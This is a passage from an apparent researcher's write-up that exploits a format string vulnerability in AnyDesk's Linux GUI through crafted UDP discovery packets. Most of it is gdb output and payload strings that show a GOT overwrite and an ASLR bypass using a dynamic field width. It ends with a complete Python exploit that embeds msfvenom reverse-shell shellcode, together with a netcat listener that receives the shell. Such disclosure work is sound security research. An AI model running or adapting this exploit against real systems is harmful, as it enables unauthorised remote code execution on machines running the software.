0168| 0x7ffffffeba18 --> 0x7ffff1431f9b (<__GI___libc_realloc+875>:	mov    r8,QWORD PTR [rsp+0x8])
0176| 0x7ffffffeba20 --> 0x7ffff5e969e1 --> 0x4600303262696c67 ('glib20')
...

```

We can see a few occurrences of the heap address of the format string. Although we control parts of the format string, we don’t control the address, which is what we would need to. Searching even further down the stack for possible data we can control does not yield anything useful. So it seems that we can’t control any data, which we can access with the format string. Is this already a dead end? Of course not!

Taking a look at the values above again, we can see that there are stack addresses stored on the stack. There are even stack addresses, which reference the area we can access. For example at offset `112` the stack address `0x7ffffffeba18` is stored, which corresponds to offset `168`:

```

...
0112| 0x7ffffffeb9e0 --> 0x7ffffffeba18 --> 0x7ffff1431f9b (<__GI___libc_realloc+875>:	mov    r8,QWORD PTR [rsp+0x8])
...
0168| 0x7ffffffeba18 --> 0x7ffff1431f9b (<__GI___libc_realloc+875>:	mov    r8,QWORD PTR [rsp+0x8])
...

```

If we use the appropriate argument selector we can use this stack address to write to the area we can access. We can then use another argument selector to reference the data we wrote. The following picture visualizes the basic idea:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_06-1.png)

The problem here is that we cannot do this in a single call of `vsnprintf`. All referenced data is fetched **before** data is written by the `%n` format specifier. This means that the `%19$ln` would indeed overwrite the data on the stack, but the `%26$ln` would still evaluate to the old value, which was stored there. Accordingly we need two calls:

1. Store address of `time` `GOT` entry on the stack
2. Write to previously stored `GOT` entry address in order to control instruction pointer

As you may remember, the vulnerable call to `vsnprintf` is actually made twice for the very same format string. Though it turned out that the call path for both of these calls vary. Because of this also the stack layout varies. This means that an argument selector (e.g. `%26$ln`) on the first call will not reference the same value on the second call. We also need to keep in mind that we cannot change the format string in-between the two calls. If we e.g. use `%200$n` on the first call, to write the `GOT` address on the stack, we need to ensure that `%200$n` on the second call also references a writable address, because we trigger a segmentation fault otherwise. This is not only true for `%n` we use to store the `GOT` address but also for the second `%n`, we need to use in order to actually write to the `GOT` entry. Unfortunately there did not seem to be any values on the stack, which would fulfill these requirements.

Thus we need another approach. The first thing that came into my mind was to send two independent announcement frames. We need to trigger the vulnerability twice, so let’s just trigger it twice via the initial attack vector. Because of the duplicate call this actually results in four calls to `vsnprintf`. We still must ensure that the `%n` used on the respective first call also references a writable memory location on the associated second call, but since we only need to use one `%n` format specifier in each pair of calls, stack values can be found to fulfill this requirement.

Although the approach using two separate announcement frames seemed to work, I did not really like it. One reason for this is the duplicate call of `vsnprintf`. We must accept that the second call writes somewhere into memory even though it is not relevant for our exploit. Also the two announcement frames may interfere with legitimate announcement frames, which are sent in the same time window (the GUI gets updated only every 5 seconds). These aspects may reduce the reliability of the exploit.

While thinking about this and looking at the GUI another idea came into my mind:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_02.png)

The GUI displays not only the hostname, but also the username. So far we triggered the vulnerability only by using the hostname. But the username should also be prone to this. Let’s verify this by sending the following announcement frame:

```

p = gen_discover_packet(4919, 1, '\x85\xfeHOSTNAME %p', '\x85\xfeUSERNAME %p', 'ad', 'main')

```

After a few seconds the GUI updates and the breakpoint on the `vsnprintf` call is hit:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 47: Invalid UTF-8 encoded text in name - not valid '\205\376USERNAME %p'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010

```

Inspecting the format string (third parameter) we can see that the username indeed triggered the vulnerability. After continuing the execution the breakpoint is hit again:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 47: Invalid UTF-8 encoded text in name - not valid '\205\376HOSTNAME %p'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010

```

This time the vulnerability was triggered by the hostname. If we further continue the execution both calls (for username and hostname) are repeated.

Thus we verified that the vulnerability can be triggered using both the hostname and the username. This is a good news for our exploit because we can now use two independent format strings, which are sent in a single UDP packet and are both evaluated before the duplicate call is triggered.

What we have to do now is to find an accessible stack address, which we will write the `GOT` address to. For this we must keep in mind that the values on the stack between the two `vsnprintf` calls may change / get overwritten. If we write to an stack address, which is too near to the top of the stack, it is very likely that it has been overwritten at the time of the second call. Finding a suitable value is only a matter of try and error. We write to an address on the first call and then verify that the value we wrote is still the same on the second call.

The stack address `0x7ffffffebe70`, which can be accessed using the argument selector `%93$ln` fits our needs:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 51: Invalid UTF-8 encoded text in name - not valid '\205\376USERNAME %93$ln'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x7ffffffeacc0 --> 0x0
0008| 0x7ffffffeaaf8 --> 0x7ffffffeac50 --> 0x55fe85272064696c
0016| 0x7ffffffeab00 --> 0x171f0c0 --> 0x0
0024| 0x7ffffffeab08 --> 0x7ffffffeac50 --> 0x55fe85272064696c
0032| 0x7ffffffeab10 --> 0x7ffffffeae70 --> 0x0
0040| 0x7ffffffeab18 --> 0x7ffff5e379d4 (<g_hash_table_lookup+52>:	mov    r8d,0x2)
0048| 0x7ffffffeab20 --> 0x138b230 --> 0x11f6ab0 --> 0x11e7340 --> 0x31 ('1')
0056| 0x7ffffffeab28 --> 0x1715ca0 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 2, 0x00000000008ab346 in ?? ()
gdb-peda$ telescope 0x00007ffffffeb970 100
...
0704| 0x7ffffffebc30 --> 0x7ffffffebe70 --> 0x6ffffec070
...

```

After the first call the value `0x90` (the characters written so far) is written to `0x7ffffffebe70`:

```

gdb-peda$ ni
...
[-------------------------------------code-------------------------------------]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
   0x8ab346:	call   0x412d90 <vsnprintf@plt>
=> 0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
   0x8ab35c:	call   0x4123d0 <gettimeofday@plt>
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x7ffffffeacc0 --> 0x0
0008| 0x7ffffffeaaf8 --> 0x7ffffffeac50 --> 0x55fe85272064696c
0016| 0x7ffffffeab00 --> 0x171f0c0 --> 0x0
0024| 0x7ffffffeab08 --> 0x7ffffffeac50 --> 0x55fe85272064696c
0032| 0x7ffffffeab10 --> 0x7ffffffeae70 --> 0x0
0040| 0x7ffffffeab18 --> 0x7ffff5e379d4 (<g_hash_table_lookup+52>:	mov    r8d,0x2)
0048| 0x7ffffffeab20 --> 0x138b230 --> 0x11f6ab0 --> 0x11e7340 --> 0x31 ('1')
0056| 0x7ffffffeab28 --> 0x1715ca0 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00000000008ab34b in ?? ()
gdb-peda$ x/xg 0x7ffffffebe70
0x7ffffffebe70:	0x0000000000000090

```

When the breakpoint is hit again on the second call, the value is still the same:

```

gdb-peda$ c
Continuing.
...
[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 51: Invalid UTF-8 encoded text in name - not valid '\205\376HOSTNAME %165$p'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x2249 ('I"')
0008| 0x7ffffffeaaf8 --> 0x2bc
0016| 0x7ffffffeab00 --> 0x158c710 --> 0x0
0024| 0x7ffffffeab08 --> 0x5ecbad94
0032| 0x7ffffffeab10 --> 0x5ecbad94
0040| 0x7ffffffeab18 --> 0xab240
0048| 0x7ffffffeab20 --> 0xdd73d0 --> 0x8c3200 (mov    QWORD PTR [rdi],0xdd73d0)
0056| 0x7ffffffeab28 --> 0x3
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 1, 0x00000000008ab346 in ?? ()
gdb-peda$ x/xg 0x7ffffffebe70
0x7ffffffebe70:	0x0000000000000090

```

On the second call we can access the value using the argument selector `%165$p` (offset `1280`):

```

gdb-peda$ telescope 0x00007ffffffeb970 200
...
1280| 0x7ffffffebe70 --> 0x90
...

```
## Controlling the instruction pointer

Now we are finally ready to overwrite the `GOT` entry of `time`. At first let’s determine the address of the `GOT` entry:

```

gdb-peda$ p/x &'time@got.plt'
$1 = 0x119ddc0

```

Accordingly the `GOT` entry of `time` is stored at `0x119ddc0`. In order to write this value, we can pad the output of `vsnprintf` accordingly using a `field width`. If you are not familiar with this, please refer to my writeup on [RPISEC/MBE lab04B](https://devel0pment.de/?p=351#lab4B). The error message itself (`Failed to set text from markup ...`) contains 133 characters. Also we need to add two characters for an invalid UTF-8 sequence. Thus we have to pad the output to `18472249` characters:

```

0x119ddc0 = 18472384 (time GOT)
18472384 - 133 - 2 = 18472249

```

Let’s verify this by sending the following announcement frame:

```

p = gen_discover_packet(4919, 1, '\x85\xfeHOSTNAME %165$p', '\x85\xfe%18472249x%93$ln', 'ad', 'main')

```

After the first call to `vsnprintf` the target stack address (`0x7ffffffebe70`) actually contains the `GOT` address of `time`:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 52: Invalid UTF-8 encoded text in name - not valid '\205\376%18472249x%93$ln'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
...
gdb-peda$ x/xg 0x7ffffffebe70
0x7ffffffebe70:	0x0000006ffffec070
gdb-peda$ ni
...
gdb-peda$ x/xg 0x7ffffffebe70
0x7ffffffebe70:	0x000000000119ddc0

```

The `%165$p` format specifier on the second call successfully references the `GOT` address:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 51: Invalid UTF-8 encoded text in name - not valid '\205\376HOSTNAME %165$p'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
...
gdb-peda$ ni
gdb-peda$ x/s 0x7ffffffeafd0
0x7ffffffeafd0:	"Failed to set text from markup due to error parsing markup: Error on line 1 char 51: Invalid UTF-8 encoded text in name - not valid '\205\376HOSTNAME 0x119ddc0'"

```

The next step is to replace the `%p` format specifier with `%ln` in order to write a 8 byte value to the `GOT` entry on the second call. This way we should be able to control the instruction pointer, when the call to `time` is triggered after the `vsnprintf` call. Let’s verify this by writing the value `0x1337`:

```

0x1337 = 4919
4919 - 133 - 2 = 4784

```

This time we adjust the hostname accordingly:

```

p = gen_discover_packet(4919, 1, '\x85\xfe%4784x%165$ln', '\x85\xfe%18472249x%93$ln', 'ad', 'main')

```

After sending the frame and continuing to the second call to `vsnprintf`, to `GOT` entry of `time` is still untouched:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x2743 ("C'")
0008| 0x7ffffffeaaf8 --> 0x357
0016| 0x7ffffffeab00 --> 0x158cf10 --> 0x0
0024| 0x7ffffffeab08 --> 0x5ecbb8cc
0032| 0x7ffffffeab10 --> 0x5ecbb8cc
0040| 0x7ffffffeab18 --> 0xd0f51
0048| 0x7ffffffeab20 --> 0xdd73d0 --> 0x8c3200 (mov    QWORD PTR [rdi],0xdd73d0)
0056| 0x7ffffffeab28 --> 0x3
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 1, 0x00000000008ab346 in ?? ()
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 <time@got.plt>:	0x00007ffff7ffb930

```

By executing the `vsnprintf` call the value `0x1337` is successfully written:

```

gdb-peda$ ni
...
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 <time@got.plt>:	0x0000000000001337

```

If we now continue the execution, the immediately following call to `time` raises a segmentation fault with the instruction pointer being `0x1337`:

```

gdb-peda$ c
Continuing.

Thread 1 "anydesk" received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x1338
RBX: 0x11c5040 --> 0x21 ('!')
RCX: 0x0
RDX: 0x0
RSI: 0x7ffff1784ca0 --> 0x16c1400 --> 0x276e00 ('')
RDI: 0x7ffffffeab08 --> 0x5ecbb8cc
RBP: 0x5
RSP: 0x7ffffffeaae8 --> 0x8ab355 (lea    rdi,[rsp+0x20])
RIP: 0x1337
R8 : 0x1
R9 : 0x6e ('n')
R10: 0x1
R11: 0xa ('\n')
R12: 0x7ffffffeb898 --> 0x3000000018
R13: 0xb366d8 --> 0x62696c67 ('glib')
R14: 0x1453ea0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'")
R15: 0x4
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x1337
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaae8 --> 0x8ab355 (lea    rdi,[rsp+0x20])
0008| 0x7ffffffeaaf0 --> 0x2743 ("C'")
0016| 0x7ffffffeaaf8 --> 0x357
0024| 0x7ffffffeab00 --> 0x158cf10 --> 0x0
0032| 0x7ffffffeab08 --> 0x5ecbb8cc
0040| 0x7ffffffeab10 --> 0x5ecbb8cc
0048| 0x7ffffffeab18 --> 0xd0f51
0056| 0x7ffffffeab20 --> 0xdd73d0 --> 0x8c3200 (mov    QWORD PTR [rdi],0xdd73d0)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000001337 in ?? ()

```

We successfully control the instruction pointer.

## Hitting our shellcode: dynamic field width

At next we must decide where we want to point the instruction pointer to. At the very beginning we figured out, that the security mechanisms of the binary are quite weak. Actually the heap, where the format string we control is stored, is executable:

```

gdb-peda$ vmmap 0x1453ea0
Start              End                Perm	Name
0x011c4000         0x017c8000         rwxp	[heap]

```

This means that we can store a shellcode within the format string and redirect the instruction pointer to this shellcode. Though we need to keep in mind that we manually disabled ASLR and in fact don’t know any heap address. A common approach to bypass ALSR is to leak a memory address. Especially for basic format string vulnerabilities this is an easy to achieve goal. In this case however we don’t get any response from the application. The result of the format string is written to the log file, which we don’t have access to. Thus we cannot leak any heap address.

Nevertheless we can successfully bypass ASLR using a `dynamic field width`. Since this does not seem to be very well-known, let’s have a look at a short example. We have already used the ordinary `field width` in order to pad the output effectively increasing the amount of characters written, which makes `%n` write a bigger value:

```

user@w00d:~$ cat sample1.c
#include <stdio.h>

int main() {

  int out;
  printf("%100x%1$n", &out);
  printf("\nout = %d\n", out);

  return 0;
}

```

The `%100x` format specifier prints the first argument as a hexadecimal number, which is padded to 100 characters. Accordingly 100 characters are written. This amount will be written to the `out` variable by using the `%1$n` format specifier:

```

user@w00d:~$ ./sample1
                                                                                            ffffded4
out = 100

```

In this case the `field width` was statically set to `100`. But we can also use a `dynamic field width`:

```

user@w00d:~$ cat sample2.c
#include <stdio.h>

int main() {

  int out;
  int field_width = 123;
  printf("%1$*2$x%1$n", &out, field_width);
  printf("\nout = %d\n", out);

  return 0;
}

```

We introduced a new variable called `field_width`, which is passed as the second argument to `printf`. Also we changed the `%100x` format specifier to `%1$*2$x`. At first the syntax might look a little bit confusing, but actually it is quite simple: The `1$` at the beginning determines, which value we want to print. In this case we just take the first argument, just like the `%100x` did (4 byte of `out` address). This is separated by an asterisk (`*`) from the second part: `2$`. This determines which value should be used for the field width. In this case the variable `field_width`, which is the second argument. Accordingly when running the program the value of `field_width` (`123`) is written to the variable `out`:

```

user@w00d:~$ ./sample2
                                                                                                                   ffffded0
out = 123

```

After this short introduction to the dynamic field width, let’s see how we can leverage this feature.

When inspecting all accessible parameters on the second call to `vsnprintf` (hostname), we can see that we can access the heap address of the format string. The `reg_save_area` is stored at `0x00007ffffffeb8b0`. The value of `gp_offset` is `0x10`, which means the first argument we can access is stored at `0x00007ffffffeb8b0 + 0x10 = 0x00007ffffffeb8c0`:

```

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x11c5040 --> 0x21 ('!')
RCX: 0x7ffffffeb898 --> 0x3000000010
RDX: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'")
RSI: 0x400
RDI: 0x7ffffffeafd0 --> 0x7
RBP: 0x5
RSP: 0x7ffffffeaaf0 --> 0x28e3
RIP: 0x8ab346 (call   0x412d90 <vsnprintf@plt>)
R8 : 0x0
R9 : 0x10
R10: 0xffffffa7
R11: 0x7ffff1548550 --> 0xfff08320fff08310
R12: 0x7ffffffeb898 --> 0x3000000010
R13: 0xb366d8 --> 0x62696c67 ('glib')
R14: 0x1412190 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'")
R15: 0x4
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x28e3
0008| 0x7ffffffeaaf8 --> 0x1e6
0016| 0x7ffffffeab00 --> 0x158bf10 --> 0x0
0024| 0x7ffffffeab08 --> 0x5ecbbcb0
0032| 0x7ffffffeab10 --> 0x5ecbbcb0
0040| 0x7ffffffeab18 --> 0x76cd1
0048| 0x7ffffffeab20 --> 0xdd73d0 --> 0x8c3200 (mov    QWORD PTR [rdi],0xdd73d0)
0056| 0x7ffffffeab28 --> 0x3
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
gdb-peda$ x/2xw 0x7ffffffeb898
0x7ffffffeb898:	0x00000010	0x00000030
gdb-peda$ x/2xg 0x7ffffffeb898+8
0x7ffffffeb8a0:	0x00007ffffffeb970	0x00007ffffffeb8b0
gdb-peda$ x/4xg 0x00007ffffffeb8b0+0x10
0x7ffffffeb8c0:	0x0000000001412190	0x0000000000000000
0x7ffffffeb8d0:	0x00007ffff1784c40	0x0000000000000010

```

The first accessible argument at `0x00007ffffffeb8c0` is actually the heap address of the format string (`0x0000000001412190`). If we use this address as a `dynamic field width`, we can actually write its value to the `time` `GOT` entry.

By changing the hostname to the following value, we write the heap address + the amounts of characters written so far (error message and two bytes invalid UTF-8 sequence) to the `time` `GOT` entry:

```

p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%165$ln', '\x85\xfe%18472249x%93$ln', 'ad', 'main')

```

After sending the frame we continue to the second call. The `GOT` entry is still untouched:

```

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x11c5040 --> 0x21 ('!')
RCX: 0x7ffffffeb898 --> 0x3000000010
RDX: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 50: Invalid UTF-8 encoded text in name - not valid '\205\376%1$*1$x%165$ln'")
RSI: 0x400
RDI: 0x7ffffffeafd0 --> 0x7
RBP: 0x5
RSP: 0x7ffffffeaaf0 --> 0x2db9
RIP: 0x8ab346 (call   0x412d90 <vsnprintf@plt>)
R8 : 0x0
R9 : 0x10
R10: 0x21 ('!')
R11: 0x7ffff1548550 --> 0xfff08320fff08310
R12: 0x7ffffffeb898 --> 0x3000000010
R13: 0xb366d8 --> 0x62696c67 ('glib')
R14: 0x1570630 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 50: Invalid UTF-8 encoded text in name - not valid '\205\376%1$*1$x%165$ln'")
R15: 0x4
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 50: Invalid UTF-8 encoded text in name - not valid '\205\376%1$*1$x%165$ln'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x2db9
0008| 0x7ffffffeaaf8 --> 0x9d
0016| 0x7ffffffeab00 --> 0x158df10 --> 0x0
0024| 0x7ffffffeab08 --> 0x5ecbc775
0032| 0x7ffffffeab10 --> 0x5ecbc775
0040| 0x7ffffffeab18 --> 0x26709
0048| 0x7ffffffeab20 --> 0xdd73d0 --> 0x8c3200 (mov    QWORD PTR [rdi],0xdd73d0)
0056| 0x7ffffffeab28 --> 0x3
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 1, 0x00000000008ab346 in ?? ()
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 <time@got.plt>:	0x00007ffff7ffb930

```

After executing the call the `GOT` entry contains the heap address `0x00000000015706b7`:

```

gdb-peda$ ni
...
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 <time@got.plt>:	0x00000000015706b7

```

The `%n` wrote the field width (the heap address of the format string `0x1570630`) + the characters written so far. The resulting address (`0x00000000015706b7`) references the beginning of our format specifier:

```

gdb-peda$ x/s 0x00000000015706b7
0x15706b7:	"%1$*1$x%165$ln'"

```

Since we want to make the address point to actual shellcode, which we can append to the format string, we further need to add a little bit of padding. The following hostname adds another `18` characters of padding (`%18x`) and a dummy shellcode (`0xcc`):

```

shellcode = '\xcc'
p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')

```

Now the `GOT` entry is overwritten with the address of the shellcode:

```

...
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 <time@got.plt>:	0x0000000001379549

gdb-peda$ x/i 0x0000000001379549
   0x1379549:	int3

```
## Final exploit

Finally it is time to generate a real payload:

```

kali@kali:~$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
...

```

Please notice the bad bytes. `0x00` is excluded to prevent the string from being terminated. `0x25` (`%`) would introduce another format specifier and `0x26` (`&`) is used by glib and must also be avoided.

The final exploit script looks like this:

```

#!/usr/bin/env python

import struct
import socket
import sys

ip = '127.0.0.1'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('>I', ad_id)
  d += struct.pack('>I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('>I', len(hn)) + hn
  d += struct.pack('>I', len(user)) + user
  d += struct.pack('>I', 0)
  d += struct.pack('>I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('>I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d

shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x59\x88\xc6"
shellcode += b"\x9c\x5f\xfe\x71\x38\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x33\xa1\x9e\x05\x35"
shellcode += b"\xfc\x2e\x52\x58\xd6\xc9\x99\x17\x69\x39\x81"
shellcode += b"\x5b\x88\xd7\xc0\x20\xfe\x71\x39\x08\xc0\x4f"
shellcode += b"\x7a\x35\xee\x2b\x52\x73\xd0\xc9\x99\x35\xfd"
shellcode += b"\x2f\x70\xa6\x46\xac\xbd\x07\xf1\x74\x4d\xaf"
shellcode += b"\xe2\xfd\xc4\xc6\xb6\xca\x17\x3b\xe1\xa8\xb3"
shellcode += b"\x2c\x96\x71\x6b\x11\x01\x21\xce\x08\xb6\xf8"
shellcode += b"\xde\x56\x8d\xc6\x9c\x5f\xfe\x71\x38"

print('sending payload ...')
p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()
print('reverse shell should connect within 5 seconds')

```

Before running the exploit we start a `nc` listener on port 4444:

```

user@w00d:~$ nc -lvp 4444
Listening on [0.0.0.0] (family 0, port 4444)

```

Now we run the exploit script:

```

user@w00d:~$ ./final_exploit.py
sending payload ...
reverse shell should connect within 5 seconds

```

After a few seconds the front-end updates its online states, which triggers the exploit. The shellcode is executed and we receive a reverse shell:

```

...
Connection from localhost 52000 received!
id
uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)

```
# Conclusion

By sending a single UDP packet to the target machine we are able to successfully exploit the discovered format string vulnerability to gain Remote Code Execution. In order to achieve this we triggered the vulnerability twice: once to write the address of the `GOT` entry of the `time` function to the stack and a second time to write the heap address of our shellcode to the `GOT` entry using a `dynamic field width`.

